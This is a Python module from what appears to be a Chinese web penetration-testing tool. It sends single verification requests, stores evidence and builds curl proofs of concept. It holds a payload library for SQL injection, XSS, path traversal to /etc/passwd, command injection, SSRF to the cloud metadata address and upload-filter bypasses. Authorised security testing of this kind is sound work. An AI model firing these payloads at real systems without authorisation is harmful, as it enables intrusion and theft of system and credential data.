#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""验证: 请求构造 + 载荷库 + 结论留证。

定位是"把疑似变成结论", 所以只做单次请求、原样返回响应,
不做批量爆破 —— 批量是检测模块的事。
"""
import json
import re
import time

from core import store
from core import util

# 载荷按漏洞类型分组, 不按工具名 —— 换工具不影响操作习惯
PAYLOADS = {
    "SQL 注入": [
        ("布尔真", "' OR '1'='1"),
        ("布尔假", "' AND '1'='2"),
        ("联合查询", "' UNION SELECT 1,2,3-- -"),
        ("报错注入", "' AND extractvalue(1,concat(0x7e,version()))-- -"),
        ("时间盲注", "' AND SLEEP(3)-- -"),
        ("堆叠查询", "'; SELECT 1-- -"),
    ],
    "跨站脚本": [
        ("基础", "<script>alert(1)</script>"),
        ("属性逃逸", "\"><img src=x onerror=alert(1)>"),
        ("伪协议", "javascript:alert(1)"),
        ("SVG", "<svg onload=alert(1)>"),
    ],
    "目录遍历": [
        ("Unix", "../../../../etc/passwd"),
        ("编码绕过", "..%2f..%2f..%2fetc%2fpasswd"),
        ("PHP 伪协议", "php://filter/convert.base64-encode/resource=index.php"),
        ("Windows", "..\\..\\..\\windows\\win.ini"),
    ],
    "命令注入": [
        ("分号", "; id"),
        ("管道", "| id"),
        ("反引号", "`id`"),
        ("换行", "%0aid"),
    ],
    "SSRF": [
        ("本机", "http://127.0.0.1:80/"),
        ("元数据", "http://169.254.169.254/latest/meta-data/"),
        ("内网段", "http://192.168.0.1/"),
    ],
    "越权": [
        ("改 id", "把请求里的 userId 改成他人 id"),
        ("去鉴权头", "删掉 Authorization / Cookie 后重放"),
        ("改角色", "role=user 改为 role=admin"),
    ],
    "文件上传": [
        ("双扩展名", "shell.php.jpg"),
        ("大小写", "shell.PHP"),
        ("截断", "shell.php%00.jpg"),
        ("内容类型绕过", "Content-Type: image/png 但内容为 PHP"),
    ],
}

METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

MAX_BODY = 60000     # 回传前端上限, 避免把 8MB 帧打满


def payloads(kind=""):
    if kind:
        return {"kind": kind, "items": [{"name": n, "value": v} for n, v in PAYLOADS.get(kind, [])]}
    return {"kinds": [{"kind": k, "count": len(v)} for k, v in PAYLOADS.items()]}


def send(params):
    """发一次请求。参数: method/url/headers/body/timeout/follow。"""
    url = (params.get("url") or "").strip()
    if not url:
        raise ValueError("缺少 url")
    tgt = util.normalize_target(url)
    if not tgt:
        raise ValueError("url 格式不对")
    ok, reason, _ = util.scope_check(tgt["host"])
    if not ok:
        raise ValueError(reason)

    method = (params.get("method") or "GET").upper()
    if method not in METHODS:
        raise ValueError("不支持的方法: " + method)
    headers = params.get("headers") or {}
    if isinstance(headers, str):
        headers = _parse_headers(headers)
    body = params.get("body") or ""
    timeout = min(float(params.get("timeout") or 10), 60)
    follow = bool(params.get("follow", True))

    s = util.session()
    t0 = time.time()
    try:
        r = s.request(method, url, headers=headers, data=body.encode("utf-8") if body else None,
                      timeout=timeout, allow_redirects=follow, verify=False)
        ms = int((time.time() - t0) * 1000)
        text = r.text or ""
        return {
            "ok": True, "status": r.status_code, "ms": ms,
            "size": len(r.content or b""), "url": r.url,
            "headers": dict(list(r.headers.items())[:40]),
            "body": text[:MAX_BODY],
            "truncated": len(text) > MAX_BODY,
            "history": [{"status": h.status_code, "url": h.url} for h in (r.history or [])][:6],
        }
    except Exception as e:
        ms = int((time.time() - t0) * 1000)
        return {"ok": False, "status": 0, "ms": ms, "error": str(e)[:200]}


def _parse_headers(s):
    out = {}
    for line in (s or "").splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


def save(params):
    """保存结论。risk_id 为空时只留证不挂风险(手动请求也能归档)。"""
    rid = int(params.get("risk_id") or 0)
    tid = int(params.get("task_id") or 0)
    if rid and not tid:
        r = store.risk_get(rid)
        if r:
            tid = r["task_id"]
    conclusion = params.get("conclusion") or ""
    eid = store.ex(
        "INSERT INTO atk_evidence(risk_id, task_id, request, response, conclusion, poc, created_at) "
        "VALUES(?,?,?,?,?,?,?)",
        (rid, tid,
         json.dumps(params.get("request") or {}, ensure_ascii=False)[:8000],
         json.dumps(params.get("response") or {}, ensure_ascii=False)[:16000],
         conclusion, (params.get("poc") or "")[:8000], store.now()),
    )
    if rid and conclusion in ("确认", "误报"):
        store.risk_mark(rid, "已确认" if conclusion == "确认" else "误报")
    if tid:
        store.task_touch(tid)
    return {"evidence_id": eid, "risk_status": conclusion or "未判定"}


def gen_poc(params):
    """把一次请求转成可直接跑的 curl 片段。"""
    req = params.get("request") or {}
    url = req.get("url") or ""
    method = (req.get("method") or "GET").upper()
    headers = req.get("headers") or {}
    body = req.get("body") or ""
    parts = ["curl -i -sS -X %s '%s'" % (method, url)]
    for k, v in (headers or {}).items():
        parts.append("  -H '%s: %s'" % (k, str(v).replace("'", "'\\''")))
    if body:
        parts.append("  --data-raw '%s'" % str(body).replace("'", "'\\''"))
    return {"poc": " \\\n".join(parts)}
